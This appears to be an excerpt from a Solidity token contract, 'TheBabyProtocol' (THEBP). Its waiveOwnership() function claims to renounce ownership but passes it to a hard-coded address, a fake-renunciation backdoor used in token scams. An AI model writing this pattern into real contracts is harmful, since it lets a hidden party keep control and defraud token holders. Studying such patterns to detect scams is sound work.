...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xD4aeCdcf0577c6463E86eFbc0254feB4d3664b6c));
        _owner = address(0xD4aeCdcf0577c6463E86eFbc0254feB4d3664b6c);
    }
...
contract TheBabyProtocol is Context, IERC20, Ownable {
    ...
    string private _name = "TheBabyProtocol";
    string private _symbol = "THEBP";
